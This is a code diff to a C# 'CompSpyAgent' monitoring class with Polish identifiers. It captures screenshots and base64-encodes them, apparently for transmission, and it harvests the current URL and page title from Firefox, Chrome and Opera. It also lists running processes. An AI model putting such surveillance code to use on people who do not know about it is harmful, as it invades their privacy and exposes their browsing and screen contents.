@@ -22,8 +22,7 @@ namespace CompSpyAgent
         public bool automatycznie;
         public int czasAutomatycznie;
         public DateTime czasOst;
-
-
+        
             public Spy()
         {
             bmp = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height, System.Drawing.Imaging.PixelFormat.Format32bppRgb);
@@ -59,7 +58,8 @@ namespace CompSpyAgent
             listaStron.Clear();
             listaZPrzegladarki("Firefox");
             //listaZPrzegladarki("firefox");
-            listaZPrzegladarki("Chrome");
+            listaZPrzegladarki("chrome");
+            listaZPrzegladarki("opera");
 
 
 
@@ -73,12 +73,13 @@ namespace CompSpyAgent
                 DdeClient dde = new DdeClient(przegladarka, "WWW_GetWindowInfo");
                 dde.Connect();
                 string url = dde.Request("URL", int.MaxValue);
-                string[] urls = url.Split(new string[] { "\",\"" }, StringSplitOptions.RemoveEmptyEntries);
+               string[] urls = url.Split(new string[] { ",", "\"" }, StringSplitOptions.RemoveEmptyEntries);
                 dde.Disconnect();
-                foreach(var u in urls)
-                {
-                    listaStron.Add(u);
-                }
+
+                listaStron.Add("[" + przegladarka + "]");
+                listaStron.Add("URL: " + urls[0]);
+                listaStron.Add("Title: " + urls[1]);
+
             }
             catch
             {
@@ -91,41 +92,29 @@ namespace CompSpyAgent
             p.Image = bmp;
         }
 
-        public String getHQScreen()
+        public Bitmap getHQScreen()
         {
            Bitmap img = new Bitmap(bmp, new Size(960, 540)); // 1/2 zdjecia
-            String ret;
-
-            using(System.Drawing.Image img2 = img)
-            {
-                using (MemoryStream m = new MemoryStream())
-                {
-                    img2.Save(m, img.RawFormat);
-                    byte[] bytes = m.ToArray();
-                    ret = Convert.ToBase64String(bytes);
-                }
-            }
-            return ret;
+            return img;
         }
 
-        public String getLQScreen()
+        public Bitmap getLQScreen()
         {
-            Image img = new Bitmap(bmp, new Size(240, 135)); // 1/8 zdjecia
-            String ret;
-
+            Bitmap img = new Bitmap(bmp, new Size(240, 135)); // 1/8 zdjecia
+            return img;
+        }
+        public String getImageBase64(Bitmap img)
+        {
             using (System.Drawing.Image img2 = img)
             {
                 using (MemoryStream m = new MemoryStream())
                 {
                     img2.Save(m, img.RawFormat);
                     byte[] bytes = m.ToArray();
-                    ret = Convert.ToBase64String(bytes);
+                    return Convert.ToBase64String(bytes);
                 }
             }
-
-            return ret;
         }
-        
 
         public void getListaProcesow(ListView lw)
         {
